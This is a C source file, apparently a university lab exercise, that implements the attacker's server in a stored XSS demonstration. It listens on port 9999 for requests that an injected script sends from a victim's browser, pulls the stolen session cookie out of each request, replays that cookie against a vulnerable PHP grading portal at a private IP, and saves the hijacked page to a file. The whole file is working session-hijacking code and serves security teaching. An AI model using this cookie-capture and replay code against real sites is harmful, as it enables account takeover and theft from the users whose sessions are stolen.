/*
 * ex3_stored.c
 *
 * Stored XSS Attack Demonstration – Attacker's Server
 *
 * This program implements aHTTP server that listens on port 9999
 * and captures HTTP requests containing stolen session cookies generated
 * by a stored XSS vulnerability.
 *
 * After extracting the session cookie, the program forwards it to the
 * vulnerable web application and writes the HTTP response to a file.
 *
 * Output file: spoofed-stored.txt
 *
 * Compilation:
 * gcc -Wall -Wextra -Werror -Wconversion ex3_stored.c -o ex3_stored
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//  web server config
#define WEB_PORT 80
#define WEB_IP "192.168.1.203"
// port that the attacker server listens on
#define PORT 9999
// consts
#define BUFFER_SIZE 8192
#define COOKIE_LEN 64
#define OUTPUT_FILE "spoofed-stored.txt"
// return value for failure
#define FAILURE 0
// return value for success
#define SUCCESS 1

/*
 * extract_sessid
 *
 * Extracts the stolen session identifier from a raw HTTP request.
 *
 * The function searches for the substring "cookie=" and extracts only
 * the cookie value itself, stopping at whitespace or line terminators.
 *
 * Parameters:
 *   request    - Raw HTTP request received from victim browser
 *   sessid_out - Output buffer to store extracted session ID
 *   out_size   - Size of output buffer
 *
 * Returns:
 *   SUCCESS (1) if a session ID was successfully extracted
 *   FAILURE (0) if not found or buffer limits are exceeded
 */
static int extract_sessid(const char *request,
                          char *sessid_out,
                          size_t out_size)
{
  // locate "cookie=" substring in HTTP request
  const char *cookie_start = strstr(request, "cookie=");
  if (cookie_start == NULL) {
    return FAILURE;
  }
  // skip past "cookie="
  cookie_start += strlen("cookie=");

  /* expect cookie=....*/

  const char *end = cookie_start;
  while (*end != ' ' &&
         *end != '\r' &&
         *end != '\n')
  {
    end++;
  }
  // calc len
  size_t len = (size_t)(end - cookie_start);
  // check if len valid
  if (len == 0 || len >= out_size)
    return FAILURE;
  // copy cookie value and null-terminate
  memcpy(sessid_out, cookie_start, len);
  sessid_out[len] = '\0';

  return SUCCESS;
}

/*
 * RECV RESPONSE FROM WEB SERVER AND WRITES TO FILE
 * recv_response_from_web - reads the response from the web server and
 * writes the stolen cookie and html page to OUTPUT_FILE.
 * @web_fd (int): the socket fd connected between attacker server and web
 * server.
 * Returns: 1 on success, 0 if error occurs.
 */
static int recv_response_from_web(int web_fd){
  // open the output file
  FILE * output_file = fopen(OUTPUT_FILE, "w");
  // check if file opened successfully
  if (!output_file) {
    return FAILURE;
  }
  // init buffer to store the response
  char response_from_web[BUFFER_SIZE];
  // 'clean' the buffer
  memset(response_from_web,0,BUFFER_SIZE);
  // flg that indicates at least one byte of response was captured
  int recv_flg=0;
  // init len of received bytes
  ssize_t recv_len;
  // keep reading response until there are no bytes left (to read).
  while((recv_len = read(web_fd, response_from_web, BUFFER_SIZE - 1))>0){
    // write to the output file the bytes just captured
    fwrite(response_from_web,1,(size_t)recv_len,output_file);
    // 'clean' the buffer - making space for the unread bytes
    memset(response_from_web,0,BUFFER_SIZE);
    // recv_len > 0 at least once
    recv_flg=1;
  }
  // close the OUTPUT_FILE - cuz we wrote the response
  fclose(output_file);

  return recv_flg;
}

/*
 * send_request_to_web
 *
 * Sends an HTTP GET request to the vulnerable web app
 * using the stolen session cookie.
 *
 * Parameters:
 *   cookie_id - Stolen session cookie value
 *
 * Returns:
 *   SUCCESS (1) on successful request and response capture
 *   FAILURE (0) on any socket or I/O error
 */
static int send_request_to_web(const char *cookie_id)
{
  // open web socket
  int web_fd = socket (AF_INET, SOCK_STREAM, 0);
  if (web_fd < 0) {
    return FAILURE;
  }

  struct sockaddr_in web_addr;
  web_addr.sin_family = AF_INET;
  web_addr.sin_port = htons (WEB_PORT);
  // conver IP string to binary
  if (inet_pton (AF_INET, WEB_IP, &web_addr.sin_addr) <= 0){
    close (web_fd);
    return FAILURE;
  }
  // wait for connection
  if (connect (web_fd, (struct sockaddr *) &web_addr, sizeof (web_addr)) < 0){
    close(web_fd);
    return FAILURE;
  }
  // init buffer
  char request[BUFFER_SIZE];
  // Construct HTTP GET request with stolen cookie
  int len = snprintf (request, sizeof (request),
                      "GET /GradersPortalTask2.php HTTP/1.1\r\n"
                      "Host: %s\r\n"
                      "Cookie: %s\r\n"
                      "Connection: close\r\n\r\n",
                      WEB_IP, cookie_id);
  // validate len
  if (len <= 0 || len >= BUFFER_SIZE){
    close(web_fd);
    return FAILURE;
  }
  // send req
  if (send (web_fd, request, strlen(request), 0) < 0){
    close(web_fd);
    return FAILURE;
  }
  // receive and store response
  if (recv_response_from_web (web_fd) != 1){
    close (web_fd);
    return FAILURE;
  }

  close(web_fd);
  return SUCCESS;
}

/*
 * setup_server_socket - opens socket and configures it to allow reusing
 * addresses
 * and ports. ( SO_REUSEADDR and SO_REUSEPORT)
 * Returns fd of the opened socket. else, if couldn't open and set its options
 * as described above - the program will exit with exit code 1 = EXIT_FAILURE.
 */
static int setup_server_socket(void)
{
  // open socket
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  // check if opened successfully
  if (fd < 0) {
    exit(EXIT_FAILURE);
  }
  // setting options - taken from ex0.pdf
  int opt = 1;
  // allows reusing a local addr (IP+PORT) even if it's still marked "in
  // use" after closing (in case restarting server quickly)
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    close(fd);
    exit(EXIT_FAILURE);
  }
  // reusing port - allows multiple sockets (or processes)
  // to bind to the same port number.
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT,
                 &opt, (socklen_t)sizeof(opt)) < 0) {
    close(fd);
    exit(EXIT_FAILURE);
  }
  // return the opened sockect fd.
  return fd;
}
/*
 * binds the server socket to PORT and start listening.
 * @ server_fd - socket id
 * Returns 1 on success and 0 on failure.
 */
static int bind_and_listen(int server_fd)
{
  // init local server address
  struct sockaddr_in server_addr;
  // 'clean' to avoid garbage
  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET; // IPv4
  server_addr.sin_addr.s_addr = INADDR_ANY; // accept any local net interface
  server_addr.sin_port = htons(PORT); // converts to net byte order
  // binds the socket to address and port
  if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    return FAILURE;
  }
  // put socket in listening mode
  if (listen(server_fd, 1) < 0) {
    return FAILURE;
  }
  return SUCCESS;
}

/*
 * waits (blocks) until an incoming client establishes a TCP connection
 * to the listening server socket.
 * @server_fd - listening server socket
 * @client_addr - stores the clients address and port
 * Returns client socket on success
 */
static int accept_client(int server_fd, struct sockaddr_in *client_addr){
  // length of client address atruct
  socklen_t  client_addr_len = sizeof(client_addr);
  // accept() blocks until a client connects
  int client_fd = accept(server_fd, (struct sockaddr *)&client_addr,
                         &client_addr_len);
  return client_fd;
}
/*
 * send_http_response - Sends a minimal HTTP 200 OK response
 * @client_fd: File descriptor of the connected client socket
 */
static void send_http_response(int client_fd) {
  const char *response =
      "HTTP/1.1 200 OK\r\n"
      "Content-Type: text/html\r\n"
      "Content-Length: 27\r\n"
      "Connection: close\r\n"
      "\r\n"
      "<html>Request logged</html>";

  ssize_t sent = write(client_fd, response, strlen(response));
  (void)sent;
}

/*
 * main
 *
 * Program entry point.
 *
 * Execution flow:
 * 1. Create attacker server socket
 * 2. Bind and listen on port 9999
 * 3. Accept victim connection
 * 4. Read stolen HTTP request
 * 5. Extract session cookie
 * 6. Forward request to target web server
 * 7. Save response and exit
 */
int main(void) {

  // SET UP SERVER SOCKET
  int server_fd = -1;
  server_fd = setup_server_socket();
  if (server_fd < 0)
  {
    close(server_fd);
    exit(EXIT_FAILURE);
  }
  // BIND AND LISTEN
  int bind_n_listen = bind_and_listen(server_fd);
  if (bind_n_listen!=1){
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // ACCEPT CLIENT
  int client_fd = -1;
  struct sockaddr_in client_addr;
  client_fd = accept_client(server_fd, &client_addr);
  if (client_fd < 0){
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // HANDLE CLIENT
  char buffer[BUFFER_SIZE];
  // READ STOLEN CLIENT
  ssize_t bytes_read;
  memset(buffer, 0, BUFFER_SIZE);
  bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
  if (bytes_read < 0) {
    close(client_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }
  buffer[bytes_read] = '\0';

  // SEND RESPONSE TO VICTIM
  send_http_response(client_fd);
  // FETCH
  char sessid[256];
  memset(sessid, 0, sizeof(sessid));
  if (!extract_sessid(buffer, sessid, sizeof(sessid))) {
    close(client_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
  if (send_request_to_web(sessid)!=1){

    close(client_fd);
    close(server_fd);
    exit(EXIT_FAILURE);
  }

  // TERMINATE
  close(client_fd);
  close(server_fd);
  exit (EXIT_SUCCESS);
}
